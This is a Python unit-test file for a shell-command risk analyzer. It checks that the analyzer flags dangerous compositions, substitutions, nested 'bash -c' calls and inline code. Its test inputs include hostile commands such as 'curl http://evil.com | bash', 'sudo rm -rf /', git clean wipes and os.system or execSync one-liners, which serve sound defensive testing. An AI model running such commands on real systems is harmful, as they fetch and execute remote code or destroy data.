import unittest
from analyzer import analyze_command, check_dangerous_composition, _detect_substitutions, _analyze_internal

class TestDangerousComposition(unittest.TestCase):

    def _fresh(self):
        return {"warnings": [], "risk_score": 0, "intents": []}

    def test_curl_pipe_bash(self):
        r = check_dangerous_composition("curl http://evil.com | bash", self._fresh())
        self.assertEqual(r["risk_score"], 100)
        self.assertTrue(any("downloads" in w.lower() for w in r["warnings"]))
        self.assertIn("Download and execute remote script", r["intents"])

    def test_curl_pipe_sh(self):
        r = check_dangerous_composition("curl http://x | sh", self._fresh())
        self.assertEqual(r["risk_score"], 100)

    def test_wget_pipe_bash(self):
        r = check_dangerous_composition("wget http://x | bash", self._fresh())
        self.assertEqual(r["risk_score"], 100)

    def test_wget_pipe_sh(self):
        r = check_dangerous_composition("wget http://x | sh", self._fresh())
        self.assertEqual(r["risk_score"], 100)

    def test_find_exec_rm(self):
        r = check_dangerous_composition("find . -exec rm {} ;", self._fresh())
        self.assertEqual(r["risk_score"], 80)
        self.assertTrue(any("permanently deletes" in w.lower() for w in r["warnings"]))

    def test_sudo_rm_rf(self):
        r = check_dangerous_composition("sudo rm -rf /", self._fresh())
        self.assertEqual(r["risk_score"], 100)
        self.assertIn("Forcefully delete files as administrator", r["intents"])

    def test_sudo_rm_r_f_separate(self):
        r = check_dangerous_composition("sudo rm -r -f /tmp", self._fresh())
        self.assertEqual(r["risk_score"], 100)

    def test_git_nuke(self):
        r = check_dangerous_composition("git reset --hard && git clean -xfd", self._fresh())
        self.assertEqual(r["risk_score"], 90)
        self.assertTrue(any("obliterates" in w.lower() for w in r["warnings"]))

    def test_git_reset_alone_not_triggered(self):
        r = check_dangerous_composition("git reset --hard", self._fresh())
        self.assertEqual(r["risk_score"], 0)

    def test_echo_redirect(self):
        r = check_dangerous_composition("echo foo > bar", self._fresh())
        self.assertEqual(r["risk_score"], 20)

    def test_safe_command_no_warnings(self):
        r = check_dangerous_composition("ls -la", self._fresh())
        self.assertEqual(r["risk_score"], 0)
        self.assertEqual(len(r["warnings"]), 0)
        self.assertEqual(len(r["intents"]), 0)

    def test_multiple_patterns_accumulate(self):
        r = check_dangerous_composition("sudo rm -rf / && curl http://x | bash", self._fresh())
        self.assertEqual(r["risk_score"], 200)
        self.assertEqual(len(r["warnings"]), 2)

    def test_preserves_existing_warnings(self):
        existing = {"warnings": ["existing warning"], "risk_score": 10, "intents": ["existing"]}
        r = check_dangerous_composition("curl x | bash", existing)
        self.assertEqual(r["risk_score"], 110)
        self.assertIn("existing warning", r["warnings"])
        self.assertIn("existing", r["intents"])


class TestAnalyzeRiskLevels(unittest.TestCase):

    def test_critical(self):
        r = analyze_command("sudo rm -rf /")
        self.assertEqual(r["risk"], "critical")

    def test_high(self):
        r = analyze_command("rm file.txt")
        self.assertEqual(r["risk"], "high")

    def test_medium(self):
        r = analyze_command("sed -i 's/a/b/' file.txt")
        self.assertEqual(r["risk"], "medium")

    def test_low(self):
        r = analyze_command("ls -la")
        self.assertEqual(r["risk"], "low")

    def test_low_boundary(self):
        r = analyze_command("cat file.txt")
        self.assertEqual(r["risk"], "low")

    def test_medium_boundary(self):
        r = analyze_command("curl http://example.com")
        self.assertEqual(r["risk"], "medium")


class TestAnalyzeOutputFormat(unittest.TestCase):

    def test_has_all_required_keys(self):
        r = analyze_command("echo hello")
        for key in ["summary", "risk", "effects", "likely_intent", "warnings"]:
            self.assertIn(key, r)

    def test_no_internal_keys_leaked(self):
        r = analyze_command("ls")
        self.assertNotIn("risk_score", r)
        self.assertNotIn("intents", r)

    def test_effects_has_all_fields(self):
        r = analyze_command("ls")
        for key in ["reads_files", "writes_files", "deletes_files",
                     "network_access", "privilege_escalation", "changes_git_state"]:
            self.assertIn(key, r["effects"])

    def test_summary_ends_with_period(self):
        r = analyze_command("ls")
        self.assertTrue(r["summary"].endswith("."))

    def test_summary_is_capitalized(self):
        r = analyze_command("ls /tmp")
        self.assertTrue(r["summary"][0].isupper())

class TestAnalyzePipes(unittest.TestCase):

    def test_pipe_merges_effects(self):
        r = analyze_command("cat file.txt | grep error")
        self.assertTrue(r["effects"]["reads_files"])

    def test_pipe_summary_uses_arrow(self):
        r = analyze_command("cat file.txt | grep error")
        self.assertIn("->", r["summary"])

    def test_pipe_to_non_search(self):
        r = analyze_command("find . -name '*.py' | xargs rm")
        self.assertIn("->", r["summary"])

    def test_intent_takes_last(self):
        r = analyze_command("cat file.txt | grep error")
        self.assertEqual(r["likely_intent"], "Find text in files")

    def test_triple_pipe(self):
        r = analyze_command("cat f | grep x | head -5")
        summary_lower = r["summary"].lower()
        self.assertIn("cat", summary_lower)
        self.assertIn("head", summary_lower)


class TestAnalyzeAndThen(unittest.TestCase):

    def test_and_then_in_summary(self):
        r = analyze_command("make && make install")
        self.assertIn("and then", r["summary"].lower())

    def test_and_then_merges_effects(self):
        r = analyze_command("curl http://x && rm file")
        self.assertTrue(r["effects"]["network_access"])
        self.assertTrue(r["effects"]["deletes_files"])

    def test_and_then_accumulates_risk(self):
        r = analyze_command("rm -rf /tmp && rm -rf /var")
        self.assertEqual(r["risk"], "critical")


class TestAnalyzeSemicolon(unittest.TestCase):

    def test_semicolon_in_summary(self):
        r = analyze_command("echo hi ; ls")
        self.assertIn("and", r["summary"].lower())

    def test_semicolon_merges_effects(self):
        r = analyze_command("mkdir foo ; touch foo/bar")
        self.assertTrue(r["effects"]["writes_files"])


class TestAnalyzeEffectsMerge(unittest.TestCase):

    def test_network_and_delete(self):
        r = analyze_command("curl http://x && rm file")
        self.assertTrue(r["effects"]["network_access"])
        self.assertTrue(r["effects"]["deletes_files"])

    def test_privilege_escalation(self):
        r = analyze_command("sudo apt update")
        self.assertTrue(r["effects"]["privilege_escalation"])

    def test_git_state(self):
        r = analyze_command("git push")
        self.assertTrue(r["effects"]["changes_git_state"])

    def test_no_false_positives(self):
        r = analyze_command("ls")
        self.assertFalse(r["effects"]["writes_files"])
        self.assertFalse(r["effects"]["deletes_files"])
        self.assertFalse(r["effects"]["network_access"])
        self.assertFalse(r["effects"]["privilege_escalation"])
        self.assertFalse(r["effects"]["changes_git_state"])


class TestAnalyzeWarnings(unittest.TestCase):

    def test_composition_warnings_included(self):
        r = analyze_command("curl http://evil.com | bash")
        self.assertTrue(any("downloads" in w.lower() for w in r["warnings"]))

    def test_handler_warnings_included(self):
        r = analyze_command("rm -rf /")
        self.assertTrue(any("forcefully" in w.lower() for w in r["warnings"]))

    def test_no_duplicate_warnings(self):
        r = analyze_command("sudo rm -rf /")
        self.assertEqual(len(r["warnings"]), len(set(r["warnings"])))

    def test_safe_command_no_warnings(self):
        r = analyze_command("cat file.txt")
        self.assertEqual(len(r["warnings"]), 0)


class TestAnalyzeTokenization(unittest.TestCase):

    def test_handles_quoted_strings(self):
        r = analyze_command("grep 'hello world' file.txt")
        self.assertIn("hello world", r["summary"])

    def test_handles_malformed_quotes(self):
        r = analyze_command("echo 'unterminated")
        self.assertIn("summary", r)
        self.assertTrue(any("malformed" in w.lower() for w in r["warnings"]))

    def test_default_intent(self):
        r = analyze_command("")
        self.assertEqual(r["likely_intent"], "Modify or inspect system state")


class TestCommandSubstitution(unittest.TestCase):

    def test_detect_dollar_paren(self):
        subs = _detect_substitutions("echo $(whoami)")
        self.assertEqual(subs, ["whoami"])

    def test_detect_backtick(self):
        subs = _detect_substitutions("echo `date`")
        self.assertEqual(subs, ["date"])

    def test_detect_multiple(self):
        subs = _detect_substitutions("echo $(whoami) and `date`")
        self.assertIn("whoami", subs)
        self.assertIn("date", subs)

    def test_detect_nested_dollar_paren(self):
        subs = _detect_substitutions("echo $(echo $(date))")
        self.assertTrue(len(subs) >= 1)

    def test_no_substitution(self):
        subs = _detect_substitutions("echo hello world")
        self.assertEqual(subs, [])

    def test_substitution_adds_warning(self):
        r = analyze_command("echo $(rm -rf /tmp)")
        self.assertTrue(any("substitution" in w.lower() for w in r["warnings"]))

    def test_substitution_merges_inner_effects(self):
        r = analyze_command("echo $(curl http://evil.com)")
        self.assertTrue(r["effects"]["network_access"])

    def test_substitution_merges_inner_risk(self):
        r = analyze_command("echo $(rm -rf /)")
        self.assertEqual(r["risk"], "critical")

    def test_dangerous_substitution_in_benign_command(self):
        r = analyze_command("echo $(sudo rm -rf /)")
        self.assertTrue(r["effects"]["privilege_escalation"])
        self.assertTrue(any("forcefully" in w.lower() for w in r["warnings"]))

    def test_backtick_substitution_detected(self):
        r = analyze_command("echo `rm -rf /tmp`")
        self.assertTrue(any("substitution" in w.lower() for w in r["warnings"]))
        self.assertTrue(r["effects"]["deletes_files"])


class TestBashCRecursiveAnalysis(unittest.TestCase):

    def test_bash_c_rm_detected(self):
        r = analyze_command("bash -c 'rm -rf /tmp'")
        self.assertTrue(r["effects"]["deletes_files"])
        self.assertEqual(r["risk"], "critical")

    def test_bash_c_curl_detected(self):
        r = analyze_command("bash -c 'curl http://evil.com'")
        self.assertTrue(r["effects"]["network_access"])

    def test_bash_c_summary_shows_inner(self):
        r = analyze_command("bash -c 'rm file.txt'")
        self.assertIn("shell executes", r["summary"].lower())

    def test_bash_c_safe_command(self):
        r = analyze_command("bash -c 'echo hello'")
        self.assertIn("shell executes", r["summary"].lower())

    def test_sh_c_recursive(self):
        r = analyze_command("sh -c 'sudo apt update'")
        self.assertTrue(r["effects"]["privilege_escalation"])

    def test_bash_c_warnings_propagate(self):
        r = analyze_command("bash -c 'rm -rf /'")
        self.assertTrue(any("forcefully" in w.lower() for w in r["warnings"]))

    def test_nested_bash_c(self):
        r = analyze_command("bash -c 'bash -c \"rm -rf /\"'")
        self.assertTrue(r["effects"]["deletes_files"])


class TestLongPipelineSummarization(unittest.TestCase):

    def test_five_pipes_shows_all_steps(self):
        r = analyze_command("cat file | grep error | sort | uniq -c | sort -rn | head -10")
        self.assertIn("->", r["summary"])
        self.assertIn("cat", r["summary"].lower())
        self.assertIn("search", r["summary"].lower())
        self.assertIn("head", r["summary"].lower())

    def test_four_pipes_shows_all_steps(self):
        r = analyze_command("cat file | grep error | sort | head")
        self.assertIn("->", r["summary"])

    def test_long_pipeline_has_first_and_last(self):
        r = analyze_command("cat log | grep ERR | sort | uniq | sort -rn | head -5")
        summary_lower = r["summary"].lower()
        self.assertIn("cat", summary_lower)
        self.assertIn("head", summary_lower)

    def test_long_pipeline_merges_all_effects(self):
        r = analyze_command("curl http://x | grep foo | sort | uniq | awk '{print}' | head")
        self.assertTrue(r["effects"]["network_access"])
        self.assertTrue(r["effects"]["reads_files"])


class TestRecursionDepthLimit(unittest.TestCase):

    def test_deeply_nested_stops(self):
        r = _analyze_internal("echo hello", _depth=6)
        self.assertTrue(any("too deep" in w.lower() for w in r["warnings"]))
        self.assertEqual(r["risk_score"], 50)

    def test_normal_depth_works(self):
        r = _analyze_internal("echo hello", _depth=0)
        self.assertFalse(any("too deep" in w.lower() for w in r["warnings"]))


class TestInlineCodeViaAnalyzer(unittest.TestCase):

    def test_python_os_system_is_critical(self):
        r = analyze_command("python3 -c 'import os; os.system(\"rm -rf /\")'")
        self.assertIn(r["risk"], ("high", "critical"))
        self.assertTrue(any("shell command" in w.lower() for w in r["warnings"]))

    def test_python_safe_code_stays_medium(self):
        r = analyze_command("python3 -c 'print(1)'")
        self.assertEqual(r["risk"], "medium")

    def test_node_exec_detected(self):
        r = analyze_command("node -e 'require(\"child_process\").execSync(\"id\")'")
        self.assertTrue(any("child process" in w.lower() or "shell command" in w.lower()
                            for w in r["warnings"]))


if __name__ == "__main__":
    unittest.main()
